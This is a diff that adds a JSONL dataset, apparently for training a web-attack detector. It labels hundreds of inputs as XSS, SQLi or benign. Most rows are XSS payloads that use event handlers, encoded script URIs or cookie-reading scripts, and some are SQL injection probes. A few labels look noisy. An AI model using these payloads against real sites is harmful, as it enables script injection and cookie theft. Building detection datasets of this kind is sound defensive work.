@@ -1,0 +1,2097 @@
+{"input":"<th onmousemove=\"alert(1)\">test<\/th>","label":"XSS"}
+{"input":"<frame onbeforepaste=\"alert(1)\" contenteditable>test<\/frame>","label":"XSS"}
+{"input":"{\"user\": \"annettethomas\", \"action\": \"edit\", \"timestamp\": \"1999-07-07T09:33:43\"}","label":"benign"}
+{"input":"top 10 cooking blogs","label":"benign"}
+{"input":":stnemmoC","label":"SQLi"}
+{"input":"<sub oncontextmenu=\"alert(1)\">test<\/sub>","label":"XSS"}
+{"input":"<command oncontextmenu=\"alert(1)\">test<\/command>","label":"XSS"}
+{"input":"<isindex draggable=\"true\" ondrag=\"alert(1)\">test<\/isindex>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><li id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/li>","label":"XSS"}
+{"input":"Contact: villegasamanda@example.net","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><thead ondrop=alert(1) contenteditable>drop here<\/thead>","label":"XSS"}
+{"input":"<meter draggable=\"true\" ondragleave=\"alert(1)\">test<\/meter>","label":"XSS"}
+{"input":"<header draggable=\"true\" ondragstart=\"alert(1)\">test<\/header>","label":"XSS"}
+{"input":"<title onmouseover=\"alert(1)\">test<\/title>","label":"XSS"}
+{"input":"GET \/list\/list HTTP\/1.1","label":"benign"}
+{"input":"<body onclick=\"alert(1)\">test<\/body>","label":"XSS"}
+{"input":"<strike onclick=\"alert(1)\">test<\/strike>","label":"XSS"}
+{"input":"{\"user\": \"johnsonbilly\", \"action\": \"delete\", \"timestamp\": \"1979-05-16T12:19:07\"}","label":"benign"}
+{"input":"<optgroup oncopy=\"alert(1)\" contenteditable>test<\/optgroup>","label":"XSS"}
+{"input":"<script onkeypress=\"alert(1)\" contenteditable>test<\/script>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><code id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/code>","label":"XSS"}
+{"input":"<select onchange=alert(1)><option>1<option>2","label":"XSS"}
+{"input":"<img id=x tabindex=1 onbeforedeactivate=alert(1)><\/img><input autofocus>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><listing style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/listing>","label":"XSS"}
+{"input":"Interesting guide!","label":"benign"}
+{"input":"Hello, my name is David Richardson.","label":"benign"}
+{"input":"<picture onkeypress=\"alert(1)\" contenteditable>test<\/picture>","label":"XSS"}
+{"input":"Hello, my name is Sean Greer.","label":"benign"}
+{"input":"{\"user\": \"qpowell\", \"action\": \"download\", \"timestamp\": \"1981-09-23T13:12:03\"}","label":"benign"}
+{"input":"<select draggable=\"true\" ondragenter=\"alert(1)\">test<\/select>","label":"XSS"}
+{"input":"<a draggable=\"true\" ondragleave=\"alert(1)\">test<\/a>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><time ondragover=alert(1) contenteditable>drop here<\/time>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><em ondragover=alert(1) contenteditable>drop here<\/em>","label":"XSS"}
+{"input":"<marquee draggable=\"true\" ondragend=\"alert(1)\">test<\/marquee>","label":"XSS"}
+{"input":"<noscript onmouseout=\"alert(1)\">test<\/noscript>","label":"XSS"}
+{"input":"<element id=x tabindex=1 onbeforedeactivate=alert(1)><\/element><input autofocus>","label":"XSS"}
+{"input":"1%27%20ORDER%20BY%201%2C2%2C3--%2B","label":"SQLi"}
+{"input":"how to music tutorial","label":"benign"}
+{"input":"<rb onmousedown=\"alert(1)\">test<\/rb>","label":"XSS"}
+{"input":"Great tutorial!","label":"benign"}
+{"input":"Great post!","label":"benign"}
+{"input":"<article onmouseleave=\"alert(1)\">test<\/article>","label":"XSS"}
+{"input":"Contact: teresa41@example.com","label":"benign"}
+{"input":"# Numeric","label":"SQLi"}
+{"input":"<button draggable=\"true\" ondragleave=\"alert(1)\">test<\/button>","label":"XSS"}
+{"input":"<cite id=x tabindex=1 onfocus=alert(1)><\/cite>","label":"XSS"}
+{"input":"<td onblur=alert(1) tabindex=1 id=x><\/td><input autofocus>","label":"XSS"}
+{"input":"{\"user\": \"karen39\", \"action\": \"edit\", \"timestamp\": \"2017-07-18T02:22:16\"}","label":"benign"}
+{"input":"feedback=Option common discuss.","label":"benign"}
+{"input":"<div id=d><x xmlns='\"><iframe onload=alert(2)\/\/'><\/div>","label":"XSS"}
+{"input":"<source id=x tabindex=1 onfocus=alert(1)><\/source>","label":"XSS"}
+{"input":"GET \/search HTTP\/1.1","label":"benign"}
+{"input":"Hello, my name is Austin Smith.","label":"benign"}
+{"input":"<\/svg>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<b onmouseup=\"alert(1)\">test<\/b>","label":"XSS"}
+{"input":"<th onmouseenter=\"alert(1)\">test<\/th>","label":"XSS"}
+{"input":"username=casesusan&password=0xV(iw7H@o","label":"benign"}
+{"input":"<multicol id=x tabindex=1 onfocus=alert(1)><\/multicol>","label":"XSS"}
+{"input":"<figcaption ondblclick=\"alert(1)\">test<\/figcaption>","label":"XSS"}
+{"input":"<marquee onstart=alert(1)>","label":"XSS"}
+{"input":"\/*start*\/' GROUP BY columnnames having 1=1 --\/*end*\/","label":"SQLi"}
+{"input":"<progress onmousemove=\"alert(1)\">test<\/progress>","label":"XSS"}
+{"input":"<tt id=x tabindex=1 onbeforedeactivate=alert(1)><\/tt><input autofocus>","label":"XSS"}
+{"input":"<data onbeforecut=\"alert(1)\" contenteditable>test<\/data>","label":"XSS"}
+{"input":"<legend onbeforecut=\"alert(1)\" contenteditable>test<\/legend>","label":"XSS"}
+{"input":"<marquee width=1 loop=1 onbounce=alert(1)>XSS<\/marquee>","label":"XSS"}
+{"input":"<span id=x tabindex=1 onfocus=alert(1)><\/span>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><q id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/q>","label":"XSS"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"Great article!","label":"benign"}
+{"input":"GET \/list\/posts\/wp-content HTTP\/1.1","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><header id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/header>","label":"XSS"}
+{"input":"<listing onpaste=\"alert(1)\" contenteditable>test<\/listing>","label":"XSS"}
+{"input":"GET \/category HTTP\/1.1","label":"benign"}
+{"input":"<kbd onkeyup=\"alert(1)\" contenteditable>test<\/kbd>","label":"XSS"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"\/%2A%E2%80%A6%2A\/","label":"SQLi"}
+{"input":"<iframe onkeypress=\"alert(1)\" contenteditable>test<\/iframe>","label":"XSS"}
+{"input":"{\"user\": \"caitlin10\", \"action\": \"delete\", \"timestamp\": \"2012-09-05T10:35:06\"}","label":"benign"}
+{"input":"<textarea type=\"text\" cols=\"50\" rows=\"10\"><\/textarea>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<div onbeforecopy=\"alert(1)\" contenteditable>test<\/div>","label":"XSS"}
+{"input":"Helpful read!","label":"benign"}
+{"input":"<span onmouseenter=\"alert(1)\">test<\/span>","label":"XSS"}
+{"input":"Hello, my name is Kenneth Murphy.","label":"benign"}
+{"input":"GET \/app\/search HTTP\/1.1","label":"benign"}
+{"input":"<multicol ondblclick=\"alert(1)\">test<\/multicol>","label":"XSS"}
+{"input":"<iframe id=%22ifra%22 src=%22\/%22><\/iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty<\/scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());<\/script>","label":"XSS"}
+{"input":"<u id=x tabindex=1 onfocusin=alert(1)><\/u>","label":"XSS"}
+{"input":"{\"user\": \"ryan41\", \"action\": \"download\", \"timestamp\": \"1978-07-03T00:46:17\"}","label":"benign"}
+{"input":"<th oncontextmenu=\"alert(1)\">test<\/th>","label":"XSS"}
+{"input":"Contact: qlynch@example.org","label":"benign"}
+{"input":"<svg><bdi onload=alert(1)><\/bdi>","label":"XSS"}
+{"input":"Hello, my name is Miranda Richard.","label":"benign"}
+{"input":"<u onbeforepaste=\"alert(1)\" contenteditable>test<\/u>","label":"XSS"}
+{"input":"<frame id=x tabindex=1 onbeforeactivate=alert(1)><\/frame>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><applet style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/applet>","label":"XSS"}
+{"input":"<strong draggable=\"true\" ondragenter=\"alert(1)\">test<\/strong>","label":"XSS"}
+{"input":"<meter id=x tabindex=1 onfocus=alert(1)><\/meter>","label":"XSS"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"page=4&sort=asc","label":"benign"}
+{"input":"what is cooking?","label":"benign"}
+{"input":"feedback=They within quickly where her pick.","label":"benign"}
+{"input":"<frameset draggable=\"true\" ondrag=\"alert(1)\">test<\/frameset>","label":"XSS"}
+{"input":"<dfn id=x tabindex=1 onbeforeactivate=alert(1)><\/dfn>","label":"XSS"}
+{"input":"<a draggable=\"true\" ondrag=\"alert(1)\">test<\/a>","label":"XSS"}
+{"input":"<menuitem id=x tabindex=1 onactivate=alert(1)><\/menuitem>","label":"XSS"}
+{"input":"how to python tutorial","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><main style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/main>","label":"XSS"}
+{"input":"<iframe\/src \\\/\\\/onload = prompt(1)","label":"XSS"}
+{"input":"<th onfocusout=alert(1) tabindex=1 id=x><\/th><input autofocus>","label":"XSS"}
+{"input":"<sub onblur=alert(1) tabindex=1 id=x><\/sub><input autofocus>","label":"XSS"}
+{"input":"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><keygen style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/keygen>","label":"XSS"}
+{"input":"Contact: fcox@example.org","label":"benign"}
+{"input":"Great tutorial!","label":"benign"}
+{"input":"<data draggable=\"true\" ondragenter=\"alert(1)\">test<\/data>","label":"XSS"}
+{"input":"AND false","label":"SQLi"}
+{"input":"<textarea onmouseover=\"alert(1)\">test<\/textarea>","label":"XSS"}
+{"input":"Insightful article!","label":"benign"}
+{"input":"<slot id=x tabindex=1 onfocus=alert(1)><\/slot>","label":"XSS"}
+{"input":"Contact: brownsherry@example.net","label":"benign"}
+{"input":"<style>:target {color:red;}<\/style><p id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/p>","label":"XSS"}
+{"input":"{\"user\": \"corey37\", \"action\": \"delete\", \"timestamp\": \"1988-09-13T19:00:46\"}","label":"benign"}
+{"input":"<meter draggable=\"true\" ondragenter=\"alert(1)\">test<\/meter>","label":"XSS"}
+{"input":"<frameset><frame id=x onfocus=alert(1)>","label":"XSS"}
+{"input":"{\"user\": \"john79\", \"action\": \"view\", \"timestamp\": \"1984-09-29T05:09:19\"}","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><abbr ondrop=alert(1) contenteditable>drop here<\/abbr>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><nav style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/nav>","label":"XSS"}
+{"input":"1'%0d ORDER%0a BY%0d 1,2,3--+\/**\/","label":"SQLi"}
+{"input":"<textarea id=x tabindex=1 onactivate=alert(1)><\/textarea>","label":"XSS"}
+{"input":"<svg><form onload=alert(1)><\/form>","label":"XSS"}
+{"input":"<details ondblclick=\"alert(1)\">test<\/details>","label":"XSS"}
+{"input":"<option id=x tabindex=1 ondeactivate=alert(1)><\/option><input id=y autofocus>","label":"XSS"}
+{"input":"<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22\/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(\/document.cookie = '(.*%3F)'\/) )    alert(c[1]); }catch(e){} };  xdr.send(); <\/script>","label":"XSS"}
+{"input":"Interesting read!","label":"benign"}
+{"input":"<svg onmouseout=\"alert(1)\">test<\/svg>","label":"XSS"}
+{"input":"Hello, my name is Daniel Harrison.","label":"benign"}
+{"input":"Contact: matthew91@example.org","label":"benign"}
+{"input":"GET \/main\/explore\/posts HTTP\/1.1","label":"benign"}
+{"input":"GET \/posts HTTP\/1.1","label":"benign"}
+{"input":"<legend onpaste=\"alert(1)\" contenteditable>test<\/legend>","label":"XSS"}
+{"input":"<head onkeyup=\"alert(1)\" contenteditable>test<\/head>","label":"XSS"}
+{"input":"name=john98&email=xfernandez@example.com","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><a ondrop=alert(1) contenteditable>drop here<\/a>","label":"XSS"}
+{"input":"Great article!","label":"benign"}
+{"input":"GET \/list\/tag HTTP\/1.1","label":"benign"}
+{"input":"<frameset onpageshow=alert(1)>","label":"XSS"}
+{"input":"<wbr onfocusout=alert(1) tabindex=1 id=x><\/wbr><input autofocus>","label":"XSS"}
+{"input":"<svg><progress onload=alert(1)><\/progress>","label":"XSS"}
+{"input":"<main onkeyup=\"alert(1)\" contenteditable>test<\/main>","label":"XSS"}
+{"input":"how to travel tutorial","label":"benign"}
+{"input":"GET \/wp-content HTTP\/1.1","label":"benign"}
+{"input":"Hello, my name is Rachel Chandler.","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><h1 style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/h1>","label":"XSS"}
+{"input":"AnD FaLsE","label":"SQLi"}
+{"input":"<code draggable=\"true\" ondragenter=\"alert(1)\">test<\/code>","label":"XSS"}
+{"input":"<marquee onkeypress=\"alert(1)\" contenteditable>test<\/marquee>","label":"XSS"}
+{"input":"<tbody draggable=\"true\" ondragend=\"alert(1)\">test<\/tbody>","label":"XSS"}
+{"input":"GET \/main\/list HTTP\/1.1","label":"benign"}
+{"input":"<wbr onmouseenter=\"alert(1)\">test<\/wbr>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><footer id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/footer>","label":"XSS"}
+{"input":"name=robert79&email=kimberly32@example.org","label":"benign"}
+{"input":"<b onkeyup=\"alert(1)\" contenteditable>test<\/b>","label":"XSS"}
+{"input":"<menu draggable=\"true\" ondragend=\"alert(1)\">test<\/menu>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><xmp style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/xmp>","label":"XSS"}
+{"input":"Helpful read!","label":"benign"}
+{"input":"<spacer draggable=\"true\" ondragstart=\"alert(1)\">test<\/spacer>","label":"XSS"}
+{"input":"<basefont id=x tabindex=1 onactivate=alert(1)><\/basefont>","label":"XSS"}
+{"input":"how to travel tutorial","label":"benign"}
+{"input":"<bdo onmouseout=\"alert(1)\">test<\/bdo>","label":"XSS"}
+{"input":"name=brobinson&email=tbell@example.com","label":"benign"}
+{"input":"<strike id=x tabindex=1 onfocusin=alert(1)><\/strike>","label":"XSS"}
+{"input":"Hello, my name is Kimberly Young.","label":"benign"}
+{"input":"Great article!","label":"benign"}
+{"input":"search=how to machine learning tutorial","label":"benign"}
+{"input":"<iFrAMe\/src \\\/\\\/onload = prompt(1)","label":"XSS"}
+{"input":"GET \/list\/posts HTTP\/1.1","label":"benign"}
+{"input":"<noframes ondblclick=\"alert(1)\">test<\/noframes>","label":"XSS"}
+{"input":"GET \/app\/tags HTTP\/1.1","label":"benign"}
+{"input":"<spacer id=x tabindex=1 onbeforeactivate=alert(1)><\/spacer>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><small id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/small>","label":"XSS"}
+{"input":"top 10 python blogs","label":"benign"}
+{"input":"name=samantha04&email=teresa08@example.org","label":"benign"}
+{"input":"page=5&sort=asc","label":"benign"}
+{"input":"page=13&sort=asc","label":"benign"}
+{"input":"<track id=x tabindex=1 onbeforedeactivate=alert(1)><\/track><input autofocus>","label":"XSS"}
+{"input":"Hello, my name is Christopher Graham.","label":"benign"}
+{"input":"<section oncontextmenu=\"alert(1)\">test<\/section>","label":"XSS"}
+{"input":"<a id=x tabindex=1 ondeactivate=alert(1)><\/a><input id=y autofocus>","label":"XSS"}
+{"input":"Contact: oanderson@example.net","label":"benign"}
+{"input":"<span draggable=\"true\" ondragleave=\"alert(1)\">test<\/span>","label":"XSS"}
+{"input":"%22","label":"SQLi"}
+{"input":"<td onpaste=\"alert(1)\" contenteditable>test<\/td>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><p ondrop=alert(1) contenteditable>drop here<\/p>","label":"XSS"}
+{"input":"<plaintext onmouseup=\"alert(1)\">test<\/plaintext>","label":"XSS"}
+{"input":"<script\/src=&#100&#97&#116&#97:text\/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)><\/script> ?","label":"XSS"}
+{"input":"feedback=Again of open such partner.","label":"benign"}
+{"input":"GET \/categories\/wp-content HTTP\/1.1","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><li ondragover=alert(1) contenteditable>drop here<\/li>","label":"XSS"}
+{"input":"<xmp onbeforecopy=\"alert(1)\" contenteditable>test<\/xmp>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><legend style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/legend>","label":"XSS"}
+{"input":"feedback=Various measure up own.","label":"benign"}
+{"input":"<base id=x tabindex=1 onactivate=alert(1)><\/base>","label":"XSS"}
+{"input":"Nice read!","label":"benign"}
+{"input":"<svg><set onend=alert(1) attributename=x dur=1s>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><image id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/image>","label":"XSS"}
+{"input":"' GrOuP By cOlUmNnAmEs hAvInG 1=1 --","label":"SQLi"}
+{"input":"<dl draggable=\"true\" ondragstart=\"alert(1)\">test<\/dl>","label":"XSS"}
+{"input":"what is python?","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><kbd ondragover=alert(1) contenteditable>drop here<\/kbd>","label":"XSS"}
+{"input":"{\"user\": \"jasmine53\", \"action\": \"delete\", \"timestamp\": \"1978-03-15T18:38:30\"}","label":"benign"}
+{"input":"name=awright&email=woodtimothy@example.com","label":"benign"}
+{"input":"<div onblur=alert(1) tabindex=1 id=x><\/div><input autofocus>","label":"XSS"}
+{"input":"<svg><shadow onload=alert(1)><\/shadow>","label":"XSS"}
+{"input":"Hello, my name is Deanna Bradford.","label":"benign"}
+{"input":"Great tutorial!","label":"benign"}
+{"input":"<figcaption onblur=alert(1) tabindex=1 id=x><\/figcaption><input autofocus>","label":"XSS"}
+{"input":"Contact: vellis@example.org","label":"benign"}
+{"input":"<style id=x tabindex=1 ondeactivate=alert(1)><\/style><input id=y autofocus>","label":"XSS"}
+{"input":"<rb draggable=\"true\" ondrag=\"alert(1)\">test<\/rb>","label":"XSS"}
+{"input":"<div id=\"121\"><html xmlns=\"http:\/\/www.w3.org\/1999\/xhtml\"","label":"XSS"}
+{"input":"<svg onkeypress=\"alert(1)\" contenteditable>test<\/svg>","label":"XSS"}
+{"input":"<strong oncut=\"alert(1)\" contenteditable>test<\/strong>","label":"XSS"}
+{"input":"<iframe src=mhtml:http:\/\/html5sec.org\/test.gif!xss.html><\/iframe>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"Hello, my name is Jessica Butler.","label":"benign"}
+{"input":"<p draggable=\"true\" ondragstart=\"alert(1)\">test<\/p>","label":"XSS"}
+{"input":"<area onpaste=\"alert(1)\" contenteditable>test<\/area>","label":"XSS"}
+{"input":"{\"user\": \"marcusmorse\", \"action\": \"edit\", \"timestamp\": \"2001-10-02T17:23:14\"}","label":"benign"}
+{"input":"<font onmousedown=\"alert(1)\">test<\/font>","label":"XSS"}
+{"input":"# ro --","label":"SQLi"}
+{"input":"<summary draggable=\"true\" ondragstart=\"alert(1)\">test<\/summary>","label":"XSS"}
+{"input":"<a ondblclick=\"alert(1)\">test<\/a>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><iframe id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/iframe>","label":"XSS"}
+{"input":"how to python tutorial","label":"benign"}
+{"input":"<q onmousemove=\"alert(1)\">test<\/q>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><nav style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/nav>","label":"XSS"}
+{"input":"' UNION SELECT sum(columnname ) from tablename --","label":"SQLi"}
+{"input":"Contact: tanyarodriguez@example.com","label":"benign"}
+{"input":"feedback=Other might economy million identify.","label":"benign"}
+{"input":"<picture draggable=\"true\" ondragend=\"alert(1)\">test<\/picture>","label":"XSS"}
+{"input":"\"><img src=x onerror=prompt(1);>","label":"XSS"}
+{"input":"GET \/tag\/tags HTTP\/1.1","label":"benign"}
+{"input":"<style>:target {color:red;}<\/style><button id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/button>","label":"XSS"}
+{"input":"{\"user\": \"duane02\", \"action\": \"view\", \"timestamp\": \"2000-08-06T19:45:41\"}","label":"benign"}
+{"input":"GET \/tags\/list HTTP\/1.1","label":"benign"}
+{"input":"<option oncut=\"alert(1)\" contenteditable>test<\/option>","label":"XSS"}
+{"input":"<small onblur=alert(1) tabindex=1 id=x><\/small><input autofocus>","label":"XSS"}
+{"input":"<tr onpaste=\"alert(1)\" contenteditable>test<\/tr>","label":"XSS"}
+{"input":"GET \/tag\/blog HTTP\/1.1","label":"benign"}
+{"input":"<pre onclick=\"alert(1)\">test<\/pre>","label":"XSS"}
+{"input":"<tfoot onkeypress=\"alert(1)\" contenteditable>test<\/tfoot>","label":"XSS"}
+{"input":"best travel books","label":"benign"}
+{"input":"{\"user\": \"jessica61\", \"action\": \"edit\", \"timestamp\": \"2011-07-17T05:46:08\"}","label":"benign"}
+{"input":"what is machine learning?","label":"benign"}
+{"input":"name=josephcastro&email=stevenscatherine@example.com","label":"benign"}
+{"input":"\/*start*\/Finding the table name\/*end*\/","label":"SQLi"}
+{"input":"<style>@keyframes slidein {}<\/style><embed style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/embed>","label":"XSS"}
+{"input":"--%20or%20%23","label":"SQLi"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><dt id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/dt>","label":"XSS"}
+{"input":"finance examples in 2025","label":"benign"}
+{"input":"<main onbeforepaste=\"alert(1)\" contenteditable>test<\/main>","label":"XSS"}
+{"input":"<div id=x tabindex=1 onactivate=alert(1)><\/div>","label":"XSS"}
+{"input":"<data onmousemove=\"alert(1)\">test<\/data>","label":"XSS"}
+{"input":"<u onkeyup=\"alert(1)\" contenteditable>test<\/u>","label":"XSS"}
+{"input":"GET \/app HTTP\/1.1","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><dir ondragover=alert(1) contenteditable>drop here<\/dir>","label":"XSS"}
+{"input":"<keygen onmouseleave=\"alert(1)\">test<\/keygen>","label":"XSS"}
+{"input":"search=what is machine learning?","label":"benign"}
+{"input":"Contact: ubrown@example.org","label":"benign"}
+{"input":"<keygen id=x tabindex=1 ondeactivate=alert(1)><\/keygen><input id=y autofocus>","label":"XSS"}
+{"input":"best travel books","label":"benign"}
+{"input":"Great guide!","label":"benign"}
+{"input":"cooking examples in 2025","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><s style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/s>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><track style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/track>","label":"XSS"}
+{"input":"Hello, my name is James Torres.","label":"benign"}
+{"input":"{\"user\": \"theresaodonnell\", \"action\": \"view\", \"timestamp\": \"1996-02-06T11:07:14\"}","label":"benign"}
+{"input":"Hello, my name is Tyler Harrington.","label":"benign"}
+{"input":"GET \/categories\/tag\/main HTTP\/1.1","label":"benign"}
+{"input":"<audio onkeydown=\"alert(1)\" contenteditable>test<\/audio>","label":"XSS"}
+{"input":"<img onmouseover=\"alert(1)\">test<\/img>","label":"XSS"}
+{"input":"<br onmousemove=\"alert(1)\">test<\/br>","label":"XSS"}
+{"input":"<thead onmousemove=\"alert(1)\">test<\/thead>","label":"XSS"}
+{"input":"<input id=x tabindex=1 ondeactivate=alert(1)><\/input><input id=y autofocus>","label":"XSS"}
+{"input":"<import namespace=\"t\" implementation=\"#default#time2\">","label":"XSS"}
+{"input":"<cite oncontextmenu=\"alert(1)\">test<\/cite>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><source id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/source>","label":"XSS"}
+{"input":"<dl onclick=\"alert(1)\">test<\/dl>","label":"XSS"}
+{"input":"Hello, my name is Christopher Bryan.","label":"benign"}
+{"input":"<base onmouseout=\"alert(1)\">test<\/base>","label":"XSS"}
+{"input":"<blockquote onkeypress=\"alert(1)\" contenteditable>test<\/blockquote>","label":"XSS"}
+{"input":"GET \/blog\/list\/tag HTTP\/1.1","label":"benign"}
+{"input":"<header onmouseup=\"alert(1)\">test<\/header>","label":"XSS"}
+{"input":"<dl onmousedown=\"alert(1)\">test<\/dl>","label":"XSS"}
+{"input":"<applet onmouseover=\"alert(1)\">test<\/applet>","label":"XSS"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><ol style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/ol>","label":"XSS"}
+{"input":"<rp oncopy=\"alert(1)\" contenteditable>test<\/rp>","label":"XSS"}
+{"input":"<acronym onkeyup=\"alert(1)\" contenteditable>test<\/acronym>","label":"XSS"}
+{"input":"search=what is cooking?","label":"benign"}
+{"input":"Contact: jordan42@example.org","label":"benign"}
+{"input":"Great post!","label":"benign"}
+{"input":"Contact: qhouston@example.org","label":"benign"}
+{"input":"GET \/posts\/search\/main HTTP\/1.1","label":"benign"}
+{"input":"Nice read!","label":"benign"}
+{"input":"Contact: kevinelliott@example.org","label":"benign"}
+{"input":"{\"user\": \"kennethmartin\", \"action\": \"download\", \"timestamp\": \"2009-10-16T07:03:26\"}","label":"benign"}
+{"input":"feedback=Care station win fight Congress.","label":"benign"}
+{"input":"page=2&sort=asc","label":"benign"}
+{"input":"<nextid onkeyup=\"alert(1)\" contenteditable>test<\/nextid>","label":"XSS"}
+{"input":"<main onmouseup=\"alert(1)\">test<\/main>","label":"XSS"}
+{"input":"what is travel?","label":"benign"}
+{"input":"<data onmouseleave=\"alert(1)\">test<\/data>","label":"XSS"}
+{"input":"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())<\/script>","label":"XSS"}
+{"input":"<nobr onblur=alert(1) tabindex=1 id=x><\/nobr><input autofocus>","label":"XSS"}
+{"input":"Contact: myersjoshua@example.com","label":"benign"}
+{"input":"<thead draggable=\"true\" ondragstart=\"alert(1)\">test<\/thead>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><tt id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/tt>","label":"XSS"}
+{"input":"<svg><kbd onload=alert(1)><\/kbd>","label":"XSS"}
+{"input":"<rb oncut=\"alert(1)\" contenteditable>test<\/rb>","label":"XSS"}
+{"input":"<x\/onxxx=1","label":"XSS"}
+{"input":"Contact: april66@example.com","label":"benign"}
+{"input":"<thead onbeforecopy=\"alert(1)\" contenteditable>test<\/thead>","label":"XSS"}
+{"input":"<meta id=x tabindex=1 ondeactivate=alert(1)><\/meta><input id=y autofocus>","label":"XSS"}
+{"input":"<param onmousemove=\"alert(1)\">test<\/param>","label":"XSS"}
+{"input":"username=marshmicheal&password=&wRL@q_%16","label":"benign"}
+{"input":"<image srcset=1 onerror=alert(1)>","label":"XSS"}
+{"input":"what is travel?","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><object ondragover=alert(1) contenteditable>drop here<\/object>","label":"XSS"}
+{"input":"search=how to cooking tutorial","label":"benign"}
+{"input":"{\"user\": \"robertsisaac\", \"action\": \"delete\", \"timestamp\": \"1990-09-10T12:06:43\"}","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><output style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/output>","label":"XSS"}
+{"input":"username=jamie85&password=Up3aT%Epp$","label":"benign"}
+{"input":"<br><br><br><br><br><br><br><br><br><br>","label":"XSS"}
+{"input":"<center id=x tabindex=1 onfocus=alert(1)><\/center>","label":"XSS"}
+{"input":"Great guide!","label":"benign"}
+{"input":"best finance books","label":"benign"}
+{"input":"<param oncontextmenu=\"alert(1)\">test<\/param>","label":"XSS"}
+{"input":"<body onpageshow=alert(1)>","label":"XSS"}
+{"input":"<a onmouseleave=\"alert(1)\">test<\/a>","label":"XSS"}
